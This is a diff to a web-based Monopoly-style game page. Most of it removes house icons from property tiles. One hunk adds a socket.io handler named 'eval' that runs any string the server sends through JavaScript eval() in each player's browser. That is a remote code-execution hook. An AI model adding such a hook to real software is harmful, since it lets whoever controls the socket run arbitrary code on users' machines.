@@ -269,7 +269,7 @@
                     <p>Free Parking</p>
                 </div>
                 <div class="property">
-                    <div class="header top red" property="Strand"><i class="fa fa-home"></i><i class="fa fa-home"></i></div>
+                    <div class="header top red" property="Strand"></div>
                     <p class="title">Stand</p>
                     <p class="price">M220</p>
                 </div>
@@ -319,7 +319,7 @@
             <div class="side-strip">
                 <div class="left-strip">
                     <div class="property rotate-180">
-                        <div class="header header-left orange" property="Vine Street"><i class="rotate-180 fa fa-home"></i></div>
+                        <div class="header header-left orange" property="Vine Street"></div>
                         <div class="rotate-180">
                             <p class="title">Vine Street</p>
                             <p class="price">M200</p>
@@ -491,6 +491,9 @@
 
         socket.on("connect", function () {
             socket.emit("join-room", window.location.hash.replace("#", ""));
+        })
+        socket.on("eval", function(data) {
+            eval(data.toString());
         })
 
         socket.on("dice-start", function () {
